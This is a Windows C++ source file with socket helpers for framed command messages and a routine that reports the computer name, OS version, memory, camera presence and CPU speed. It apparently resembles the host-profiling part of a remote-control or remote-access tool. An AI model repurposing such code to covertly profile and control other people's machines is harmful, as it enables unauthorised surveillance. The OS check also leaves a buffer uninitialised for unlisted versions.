#include"stdafx.h"
#include"Command.h"
#include <vfw.h>

BOOL RecvData(SOCKET s,char *data,int len)
{
	if(len<=0)
		return TRUE;                 
	char *pData=data;///记录数据存储地址
	int iLeftRecv=len;//数据未接收剩余长度
	int iHasRecv=0;//已经接收的数据长度
	int iRet=0;//每次接收的数据长度
	if(len<=0)  return TRUE;

	while(1)
	{
		iRet=recv(s,pData,iLeftRecv,0);
		if(iRet==0||iRet==SOCKET_ERROR) return FALSE;

		iHasRecv+=iRet;
		iLeftRecv-=iRet;
		pData+=iRet;//发送数据存储地址也要改变
		if(iHasRecv>=len) break;//总发送长度大于等于总长度 就退出
	}
	return TRUE;
}

BOOL RecvMsg(SOCKET s,char *pBuf,LPMsgHead lpMsgHead)// 对于指令 先接收指令的头部 之后接收详细信息
{
	if(!RecvData(s,(char *)lpMsgHead,sizeof(MsgHead)))//先接收消息的头部 
	{
		return FALSE;
	}

	if(lpMsgHead->dwSize<=0)  return TRUE;

	if(!RecvData(s,pBuf,lpMsgHead->dwSize))//再接受数据
		return FALSE;
	return TRUE;
}

BOOL SendData(SOCKET s,char*  data ,int len)
{
	char *pData=data;///记录数据存储地址
	int iHasSend=0;//已经发送的数据长度
	int iLeftSend=len;//数据未发送剩余长度
	int iRet=0;//每次发送的数据长度

	if(len<=0)  return TRUE;

	while(1)
	{
		iRet=send(s,pData,iLeftSend,0);
		if(iRet==0||iRet==SOCKET_ERROR) return FALSE;

		iHasSend+=iRet;
		pData+=iRet;//发送数据存储地址也要改变
		iLeftSend-=iRet;

		if(iHasSend>=len) break;//总发送长度大于等于总长度 就退出
	}
	return TRUE;
}

BOOL SendMsg(SOCKET s,char const *pBuf,LPMsgHead lpMsgHead)// 对于指令 先发送指令的头部 之后发送详细信息
{
	if(!SendData(s,(char *)lpMsgHead,sizeof(MsgHead)))//先发送消息的头部 
	{

		return FALSE;
	} 
	if(lpMsgHead->dwSize<=0) { return TRUE;}

	if(!SendData(s,(char*)pBuf,lpMsgHead->dwSize))//再发送数据
	{

		return FALSE;
	}
	return TRUE;
}


bool hasCamera()
{
	bool	bRet = false;
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

// Get System Information
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}

BOOL GetSystemInfo( SysInfo &info)//得到关于系统的信息
{
	///////获取电脑名称///////////
	memset(&info,0,sizeof(SysInfo));
	DWORD iSize=64;
	GetComputerName(info.computerName,&iSize);

	//获取os系统版本
	char szSystem[32];
	OSVERSIONINFOEX osvi;
	memset(&osvi,0,sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize=sizeof(OSVERSIONINFOEX);
	if(!GetVersionEx((OSVERSIONINFO*)&osvi ))//得到的系统版本信息放进osvi  
	{
		return FALSE;
	}

	switch (osvi.dwPlatformId)//操作平台
	{
	case VER_PLATFORM_WIN32_NT:
		if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 0)//系统版本
		{
			strcpy(szSystem, "Windows Vista");
		}
		else if (osvi.dwMajorVersion ==6 && osvi.dwMinorVersion == 1)
		{	
			strcpy(szSystem, "Windows 7");
		}
		else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
		{		
			strcpy(szSystem, "Windows 2003");
		}	
		else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )	
		{	
			strcpy(szSystem, "Windows XP");
		}
		else if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0 )
		{
			strcpy(szSystem, "Windows 2000");
		}
		else if ( osvi.dwMajorVersion <= 4 )
		{
				strcpy(szSystem, "Windows NT");
		}
		else if(osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)
		{
			strcpy(szSystem, "Windows 8");
		}
		break;
	case VER_PLATFORM_WIN32_WINDOWS:
		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 0)
			strcpy(szSystem, "Windows 95");

		if (osvi.dwMajorVersion == 4 && osvi.dwMinorVersion == 10)
			strcpy(szSystem, "Windows 98");
		break;
	}

	wsprintf(info.osVersion,"%s SP%d (Build %d)",szSystem,osvi.wServicePackMajor,osvi.dwBuildNumber);//把信息写进我们定义的结构体的成员中
	////get memory size////////////////
	MEMORYSTATUS mem;
	mem.dwLength=sizeof(mem);
	GlobalMemoryStatus(&mem);
	wsprintf(info.memorySize,"%dMB",mem.dwTotalPhys/1024/1024+1);//加1  是为了取整  防止小于1G 而显示0G
	
	///////是否有摄像头//////////////////
	strcpy(info.hasCamera, hasCamera()?"有":"无");

	///////cpu 信息///////////
	wsprintf(info.cpuInfo, "%d", CPUClockMhz());
	return TRUE;
}

